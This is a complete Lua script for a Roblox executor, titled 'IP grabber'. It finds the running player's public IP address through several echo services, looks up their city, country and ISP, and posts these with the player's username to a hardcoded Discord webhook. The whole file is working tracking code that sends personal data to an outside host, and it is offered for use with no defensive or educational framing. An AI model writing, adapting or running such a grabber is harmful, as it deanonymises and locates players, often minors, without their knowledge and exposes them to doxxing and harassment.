-- DELTA EXECUTOR - IP GRABBER (NO JSON ERRORS)
local request = (syn and syn.request) or (http and http.request) or request
if not request then warn("No HTTP"); return end

local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer
local name = player.Name

-- === GET IP (NO JSON PARSING) ===
local function getIP()
    local urls = {
        "http://icanhazip.com",
        "https://api.ipify.org",
        "http://ifconfig.me/ip",
        "https://ipinfo.io/ip"
    }

    for _, url in ipairs(urls) do
        local success, response = pcall(request, {Url = url, Method = "GET"})
        if success and response and response.Body then
            local ip = response.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
            if ip then
                return ip
            end
        end
        task.wait(0.5)
    end
    return nil
end

local ip = getIP()
if not ip then
    warn("Failed to get IP")
    return
end

print("IP:", ip)

-- === GET IP INFO (SAFE JSON) ===
local info = {country="??", city="??", isp="??", org="??", regionName="??", countryCode="??"}

pcall(function()
    local url = "http://ip-api.com/json/" .. ip .. "?fields=country,countryCode,regionName,city,isp,org"
    local resp = request({Url = url, Method = "GET"})
    if resp and resp.Body and resp.Body:find("{") then
        local success, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
        if success and data then
            info = data
        end
    end
end)

-- === SEND TO WEBHOOK ===
local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

local message = string.format(
    "**%s**\n**IP:** `%s`\n**Location:** %s, %s\n**ISP:** %s",
    name, ip,
    info.city or "Unknown",
    info.country or "Unknown",
    info.isp or "Unknown"
)

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({content = message})
    })
end)

print("Sent to webhook!")
